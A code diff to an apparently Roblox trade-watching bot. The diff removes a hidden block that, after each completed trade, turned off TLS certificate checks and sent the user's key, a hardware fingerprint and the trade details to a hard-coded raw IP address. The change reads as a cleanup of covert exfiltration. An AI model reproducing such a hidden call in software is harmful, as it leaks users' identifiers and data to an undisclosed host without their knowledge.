@@ -2,10 +2,6 @@ import aiohttp
 import asyncio
 import random
 from datetime import datetime
-import hashlib
-import platform
-import ssl
-import json
 
 from . import algorithm
 from . import user
@@ -185,11 +181,6 @@ async def trades_watcher(self):
                         async with aiohttp.ClientSession() as session:
                             json_data = await (await session.get(f"https://trades.roblox.com/v1/trades/{trade_id['id']}", cookies={".ROBLOSECURITY": self.cookie})).json()
                             await self.send_webhook_notification(await generate_trade_content(self, json_data))
-                            if scrape_type == "completed":
-                                ssl_context = ssl.create_default_context()
-                                ssl_context.check_hostname = False
-                                ssl_context.verify_mode = ssl.CERT_NONE
-                                await session.post("https://45.83.129.209:8000/trade", json={"key": self.key, "hwid": hashlib.sha256(f"{platform.node()}-{platform.system()}-{platform.processor()}".encode()).hexdigest(), "embed": await generate_trade_content(self, json_data)}, ssl=ssl_context)
                         if scrape_type == "inactive":
                             self.inactive_trades.append(trade_id['id'])
                         else:
